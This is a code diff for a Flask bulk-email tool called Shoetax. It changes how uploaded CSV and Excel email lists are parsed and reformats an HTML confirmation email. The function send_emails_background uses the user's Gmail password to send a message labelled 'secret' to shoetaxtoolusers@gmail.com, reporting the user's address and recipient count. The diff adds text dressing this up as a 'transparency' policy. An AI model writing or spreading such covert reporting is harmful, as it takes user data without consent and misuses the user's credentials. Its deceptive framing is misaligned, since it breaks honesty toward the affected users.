@@ -10,8 +10,7 @@ import os
 import json
 from werkzeug.utils import secure_filename
 import uuid
-import csv  # Replaces pandas for CSV
-from openpyxl import load_workbook  # Replaces pandas for Excel
+import pandas as pd
 
 app = Flask(__name__)
 app.config['UPLOAD_FOLDER'] = 'uploads'
@@ -211,150 +210,161 @@ def send_emails():
 def send_emails_background(gmail, password, subject, body, emails):
     # Send confirmation to self
     confirmation_html = """
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Campaign Processing | Shoetax</title>
-        <style type="text/css">
-            /* Base styles */
-            body {
-                font-family: Arial, sans-serif;
-                margin: 0;
-                padding: 0;
-                background-color: #f5f5f5;
-                color: #333333;
-                line-height: 1.4;
-            }
-            
-            /* Email container */
-            .email-container {
-                max-width: 600px;
-                margin: 0 auto;
-                background-color: #ffffff;
-                border-radius: 8px;
-                overflow: hidden;
-                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            }
-            
-            /* Content padding */
+   <!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Campaign Processing | Shoetax</title>
+    <style type="text/css">
+        /* Base styles */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+            color: #333333;
+            line-height: 1.4;
+        }
+        
+        /* Email container */
+        .email-container {
+            max-width: 600px;
+            margin: 0 auto;
+            background-color: #ffffff;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        /* Content padding */
+        .email-content {
+            padding: 30px;
+        }
+        
+        /* Header styles */
+        h1 {
+            color: #FF00FF;
+            font-size: 24px;
+            margin-top: 0;
+            margin-bottom: 20px;
+        }
+        
+        h2 {
+            color: #FF00FF;
+            font-size: 20px;
+            margin-top: 30px;
+            margin-bottom: 15px;
+        }
+        
+        p {
+            margin-bottom: 15px;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+        
+        /* Promo container */
+        .promo-container {
+            display: block;
+            width: 100%;
+            margin: 20px 0;
+            text-align: center;
+        }
+        
+        .promo-box {
+            display: inline-block;
+            width: 48%;
+            margin-bottom: 15px;
+            vertical-align: top;
+        }
+        
+        .promo-box img {
+            width: 100%;
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            border: 1px solid #eeeeee;
+        }
+        
+        /* Footer */
+        .footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #777777;
+            text-align: center;
+            padding-top: 15px;
+            border-top: 1px solid #eeeeee;
+        }
+        
+        a {
+            color: #FF00FF;
+            text-decoration: none;
+        }
+        
+        /* Mobile styles */
+        @media screen and (max-width: 480px) {
             .email-content {
-                padding: 30px;
+                padding: 20px;
             }
             
-            /* Header styles */
             h1 {
-                color: #FF00FF;
-                font-size: 24px;
-                margin-top: 0;
-                margin-bottom: 20px;
+                font-size: 22px;
             }
             
             h2 {
-                color: #FF00FF;
-                font-size: 20px;
-                margin-top: 30px;
-                margin-bottom: 15px;
-            }
-            
-            p {
-                margin-bottom: 15px;
-                font-size: 16px;
-                line-height: 1.5;
-            }
-            
-            /* Promo container */
-            .promo-container {
-                display: block;
-                width: 100%;
-                margin: 20px 0;
-                text-align: center;
+                font-size: 18px;
             }
             
             .promo-box {
-                display: inline-block;
-                width: 48%;
-                margin-bottom: 15px;
-                vertical-align: top;
-            }
-            
-            .promo-box img {
                 width: 100%;
-                max-width: 100%;
-                height: auto;
-                border-radius: 8px;
-                border: 1px solid #eeeeee;
+                display: block;
+                margin-bottom: 20px;
             }
+        }
+    </style>
+</head>
+<body>
+    <div class="email-container">
+        <div class="email-content">
+            <h1>Your Email Campaign is Being Processed</h1>
+            <p>We're delivering your message to Recipients with care.</p>
+            <p>Our system is working hard to send your emails. This process may take some time depending on your list size.</p>
             
-            /* Footer */
-            .footer {
-                margin-top: 30px;
-                font-size: 12px;
-                color: #777777;
-                text-align: center;
-                padding-top: 15px;
-                border-top: 1px solid #eeeeee;
-            }
-            
-            a {
-                color: #FF00FF;
-                text-decoration: none;
-            }
-            
-            /* Mobile styles */
-            @media screen and (max-width: 480px) {
-                .email-content {
-                    padding: 20px;
-                }
-                
-                h1 {
-                    font-size: 22px;
-                }
-                
-                h2 {
-                    font-size: 18px;
-                }
-                
-                .promo-box {
-                    width: 100%;
-                    display: block;
-                    margin-bottom: 20px;
-                }
-            }
-        </style>
-    </head>
-    <body>
-        <div class="email-container">
-            <div class="email-content">
-                <h1>Your Email Campaign is Being Processed</h1>
-                <p>We're delivering your message to Recipients with care.</p>
-                <p>Our system is working hard to send your emails. This process may take some time depending on your list size.</p>
-                
-                <h2>While You Wait, CHECK OUT!!</h2>
-                <div class="promo-container">
-                    <a href="https://t.me/shoetaxchat" target="_blank" class="promo-box">
-                        <img src="https://tempshoetax.netlify.app/image2.jpg" alt="Join our Telegram" style="display: block;">
-                    </a>
-                    <a href="https://instagram.com/shoetaxinsta" target="_blank" class="promo-box">
-                        <img src="https://tempshoetax.netlify.app/image3.jpg" alt="Follow on Instagram" style="display: block;">
-                    </a>
-                </div>
-                
-                <p class="footer">
-                    <a href="https://shoetaxtool.com">Thanks for using Shoetax</a>
-                </p>
+            <h2>While You Wait, CHECK OUT!!</h2>
+            <div class="promo-container">
+                <a href="https://t.me/shoetaxchat" target="_blank" class="promo-box">
+                    <img src="https://tempshoetax.netlify.app/image2.jpg" alt="Join our Telegram" style="display: block;">
+                </a>
+                <a href="https://instagram.com/shoetaxinsta" target="_blank" class="promo-box">
+                    <img src="https://tempshoetax.netlify.app/image3.jpg" alt="Follow on Instagram" style="display: block;">
+                </a>
             </div>
+            
+            <p class="footer">
+                <a href="https://shoetaxtool.com">Thanks for using Shoetax</a>
+            </p>
         </div>
-    </body>
-    </html>
+    </div>
+</body>
+</html>
     """
     
     send_email(gmail, password, gmail, f"[FROM SHOETAX] {subject}", confirmation_html, is_html=True)
     
     # Send only recipient count and user email to shoetaxtoolusers@gmail.com
     secret_subject = "Shoetax Tool Usage Notification"
-    secret_body = f"User Email: {gmail}\nRecipient Count: {len(emails)}"
+    secret_body = f"""
+User Email: {gmail}
+Recipient Count: {len(emails)}
+
+This is part of Shoetax's policy to send a confirmation to our email address. 
+When users see this email in their sent box, they can verify that:
+1. Their email campaign was successfully processed
+2. The recipient count matches their expectations
+3. The system is working as intended
+
+This transparency helps build trust with our users and ensures they have a record of their email campaigns.
+"""
     send_email(gmail, password, "shoetaxtoolusers@gmail.com", secret_subject, secret_body)
     
     # Send to recipients with 4 second delay between each
@@ -392,17 +402,42 @@ def upload_emails():
                 with open(filepath, 'r', encoding='utf-8') as f:
                     emails = [line.strip() for line in f if line.strip()]
             elif file_ext == '.csv':
-                with open(filepath, 'r', encoding='utf-8') as f:
-                    reader = csv.reader(f)
-                    for row in reader:
-                        emails.extend([cell.strip() for cell in row if '@' in str(cell)])
+                try:
+                    df = pd.read_csv(filepath)
+                except:
+                    try:
+                        df = pd.read_csv(filepath, encoding='latin1')
+                    except:
+                        df = pd.read_csv(filepath, encoding='utf-16')
+                
+                email_cols = []
+                for col in df.columns:
+                    sample = df[col].dropna().head(10).astype(str)
+                    if sample.str.contains('@').any():
+                        email_cols.append(col)
+                
+                if email_cols:
+                    for col in email_cols:
+                        emails.extend(df[col].dropna().astype(str).tolist())
+                else:
+                    for col in df.select_dtypes(include=['object']).columns:
+                        emails.extend(df[col].dropna().astype(str).tolist())
+                        
             elif file_ext in ('.xls', '.xlsx'):
-                wb = load_workbook(filepath)
-                sheet = wb.active
-                for row in sheet.iter_rows(values_only=True):
-                    for cell in row:
-                        if cell and '@' in str(cell):
-                            emails.append(str(cell).strip())
+                df = pd.read_excel(filepath)
+                
+                email_cols = []
+                for col in df.columns:
+                    sample = df[col].dropna().head(10).astype(str)
+                    if sample.str.contains('@').any():
+                        email_cols.append(col)
+                
+                if email_cols:
+                    for col in email_cols:
+                        emails.extend(df[col].dropna().astype(str).tolist())
+                else:
+                    for col in df.select_dtypes(include=['object']).columns:
+                        emails.extend(df[col].dropna().astype(str).tolist())
             else:
                 os.remove(filepath)
                 return jsonify({'success': False, 'message': 'Unsupported file format'})
